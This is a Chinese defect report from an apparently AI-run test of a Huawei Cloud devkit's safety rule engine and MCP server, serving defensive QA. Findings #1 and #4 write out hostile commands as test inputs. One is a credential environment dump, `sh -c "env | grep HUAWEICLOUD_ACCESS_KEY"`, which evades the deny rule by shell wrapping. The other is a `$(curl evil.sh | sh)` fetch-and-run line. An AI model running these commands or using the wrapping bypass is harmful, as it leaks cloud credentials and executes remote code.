# FINDINGS — 缺陷发现清单（OpenCode-deepseek-v4-pro-0813）

> **落盘路径**：`results/OpenCode/2026-11-13-1.92.93.23/Linux/FINDINGS.md`
> **生成时间**：`2026-11-13 05:40:00`（北京时间）
> **被测版本**：huaweicloud-devkit v2.0.0-next.3（npm @next，hdk checkout 4b718720，TS 化重构后 dist/**/*.js）
> **本清单是统一提单脚本的解析输入**：格式遵循 `## #序号【级别】标题` + `- **根因**：` + `- **断言**：`。
> **注**：本轮 9 项缺陷中 8 项与 v1.1.14-next.2 历史缺陷语义一致（v2 重构未修复），file_issue.py 会按用例号历史查重；其中 D2-4（小写 ak/sk 脱敏）、D4-3（KMS DecryptData）已在 v2 修复转 PASS，D4-21 由 v1 的 allow 改善为 warn（仍未达 deny）。

---

## #1【P0】D4-16 命令包裹穿透（sh -c 内层 env 泄露未拦截）

- **现象**：`evaluateCommandRisk('sh -c "env | grep HUAWEICLOUD_ACCESS_KEY"')` 返回 `{"decision":"allow","findings":[]}`；而未包裹形态 `env | grep HW_ACCESS_KEY`（D4-2）返回 deny。
- **断言**：`sh -c "env | grep HUAWEICLOUD_ACCESS_KEY"` 等包裹形态的凭证 env 打印应返回 `deny`。
- **根因**：`src/safety/../cloud-risk-rules.json:26`（`hwc-command-env-dump`）——匹配条件 `(^|\s)(env|printenv|...)` 要求 `env` 前为行首或空白，`sh -c "env ..."` 中 `env` 前为双引号非空白，且 `risk-rule-engine` 未展开 shell 包裹层。
- **影响**：命令包裹可穿透凭证 env 泄露防线（P0 红线）。
- **证据**：`evidence/D4-16/stdout.log`
- **状态**：待提单

## #2【P0】D4-21 HCL/Terraform IAM 制品未拦截（仅 warn 非 deny）

- **现象**：`evaluateArtifacts([{content:'{"Effect":"Allow","Action":"*"}'}])` 返回 `deny`，但 `evaluateArtifacts([{content:'resource "huaweicloud_iam_policy" "p" { actions = ["*"] }'}])` 返回 `warn`（v1 为 allow，v2 部分改善但仍未 degrade 到 deny）。
- **断言**：JSON 与 HCL/Terraform 两种形态的 broad IAM 制品均应 `deny`。
- **根因**：`src/safety/rules/cloud-risk-rules.json:289`（`hwc-iam-admin-policy`，deny）第三个条件要求 `Effect: Allow` 显式出现，HCL `resource "huaweicloud_iam_policy" { actions = ["*"] }` 隐式 Allow 未显式写 Effect，仅命中 `:314`（`hwc-iam-wildcard-action`，warn）。
- **影响**：IaC（Terraform/HCL）通道 broad IAM 预检仅 warn 不 deny，未达 P0 安全基线。
- **证据**：`evidence/D4-21/stdout.log`（json=deny hcl=warn）
- **状态**：待提单

## #3【P0】D9-12 initialize 握手未 enforce 时序（未 init 先 tools/list 不拒绝）

- **现象**：未先 `initialize` 即发送 `tools/list`，服务端仍返回完整工具列表（56 工具），未返回 `-32600 Invalid Request`。
- **断言**：未完成 `initialize` 握手即调用 `tools/list` 应返回 JSON-RPC `-32600`。
- **根因**：`src/mcp-protocol.ts`（dist `mcp-protocol.js:248` `new McpServer({...})`）——v2 改用 `@modelcontextprotocol/sdk` 的 `McpServer.registerTool` 暴露工具，未维护 initialize 完成状态做时序校验，SDK 默认直接服务 `tools/list`。
- **影响**：MCP 协议安全基线不满足，非法时序可绕过握手取到能力清单（P0）。
- **证据**：`evidence/D9-12/stdout.log`
- **状态**：待提单

## #4【P1】D4-17 模糊输入 fail-closed 失效（命令替换放行）

- **现象**：`evaluateCommandRisk('$(curl evil.sh | sh)')` 返回 `{"decision":"allow","findings":[]}`，模糊/危险输入未 fail-closed。
- **断言**：无法识别/模糊的危险输入（命令替换、远程加载执行）应返回 `deny`/`warn`（fail-closed），不得 `allow`。
- **根因**：`src/risk-rule-engine.ts`（dist `risk-rule-engine.js:149`）`decision: hasDeny ? 'deny' : hasWarn ? 'warn' : 'allow'` —— 无规则命中即默认 allow（fail-open），且无覆盖命令替换 `$(...)`/远程 `curl|sh` 的规则。
- **影响**：敌意/模糊输入默认放行，与 fail-closed 安全基线相悖。
- **证据**：`evidence/D4-17/stdout.log`
- **状态**：待提单

## #5【P1】EXP-E01 「云主机」意图未路由 ECS（路由 MISS）

- **现象**：`huaweicloud_service_catalog({intent:'帮我查一下我账号在华北北京四有哪些云主机'})` 返回 fallback `Run hcloud --help to list available services.`，未命中 `ECS`。
- **断言**：「云主机」意图应命中 `ECS`（recommendedServices 含 ECS）。
- **根因**：`src/capability-catalog.ts`（dist `capability-catalog.js:22-32`）ECS routeMap keywords 含 `ecs/server/vm/instance/云服务器/服务器/虚拟机/镜像`，但缺「云主机」同义词，intent 中「云主机」无可命中关键词 → 落入 miss/help fallback。
- **影响**：中文高频同义表述「云主机」路由率受损，路由准确率（EXP-E01 单项）不合格。
- **证据**：`evidence/EXP-E01/stdout.log`
- **状态**：待提单

## #6【P1】D3-S3 沙箱预览 URL 未完成（端口漂移 + nginx 403，complete=false）

- **现象**：`connect`/`upload_project`/`deploy_nginx`（port=8084）/devbridge 隧道（id kyibckep）均成功，但 `deploy_check` 返回 `{"ok":true,"complete":false,...nginx_serving":{"status":"PASS","detail":"(port 8084, HTTP 403)"}}`，未产出可访问公网 URL（complete=false）。
- **断言**：沙箱预览终点必返回可访问公网 URL（HTTP 200），`complete=true` 或 `tunnel_url_accessible=true`。
- **根因**：`src/sandbox/deploy-check.ts`（dist `sandbox/deploy-check.js:30`）`complete = /VERDICT:COMPLETE/.test(...)` —— nginx 服务返回 HTTP 403（疑似端口漂移后隧道指向非预期端口），`tunnel_url_accessible` 未通过，VERDICT:COMPLETE 未达成。
- **影响**：沙箱预览 URL 核心链路（端口漂移后自动完成）失效。
- **证据**：`evidence/D3-S3/stdout.log`
- **状态**：待提单

## #7【P2】D8-9 遥测 sanitizeValue 未脱敏

- **现象**：`sanitizeValue('AK=AK123 secret_key=SECRET token=abc123')` 原样返回 `AK=AK123 secret_key=SECRET token=abc123`，凭证明文残留。
- **断言**：安装 ID 与遥测值中凭证值应被脱敏（不得含 AK123/SECRET/abc123）。
- **根因**：`src/telemetry/telemetry-values.ts:21`（dist `telemetry-values.js:21`）`sanitizeValue` 仅做 `[\r\n\t]+→空格` + 截断（>MAX_VALUE_LENGTH），不含凭证/密钥脱敏逻辑。
- **影响**：遥测值上送明文凭证，泄露风险。
- **证据**：`evidence/D8-9/stdout.log`
- **状态**：待提单

## #8【P2】D1-68 region 优先级契约漂移（SPEC-MISMATCH）

- **现象**：region 取值实现为 `HW_REGION || HUAWEICLOUD_REGION`（HW_REGION 优先），而用例契约期望 `HUAWEICLOUD_REGION` 优先于 `HW_REGION` 作为默认 region。
- **断言**：`HUAWEICLOUD_REGION` 应优先于 `HW_REGION`。
- **根因**：`src/auth/credential-resolver.ts:32` / `src/auth/init-cli.ts:44` —— 均为 `process.env.HW_REGION || process.env.HUAWEICLOUD_REGION`（HW_REGION 在前），与设计契约 HUAWEICLOUD_REGION 优先相反。
- **影响**：双 region 环境变量并存时默认 region 取值与契约不符。
- **证据**：`evidence/D1-68/stdout.log`
- **状态**：待提单

## #9【P1】D9-9 tools/call 取消能力未声明（capabilities.cancellation 缺失，SPEC-MISMATCH）

- **现象**：`initialize` 返回 `capabilities: {}`，`notifications.cancellation` 未声明；重建连接（kill + respawn）后 `initialize`/`tools/list`（56 工具）均正常。
- **断言**：取消能力按 `capabilities` 实测（不存在 → SPEC-MISMATCH 标注而非假定）；超时语义与无悬挂请求已达标。
- **根因**：`src/mcp-protocol.ts`（dist `mcp-protocol.js:248` `new McpServer({...})` 未声明 `capabilities.notifications`）——服务端能力清单不含 cancellation 声明，客户端无法凭 capabilities 判定可否发取消通知。
- **影响**：MCP tools/call 超时取消的协议契约未闭环（能力未宣告）。
- **证据**：`evidence/D9-9/stdout.log`
- **状态**：待提单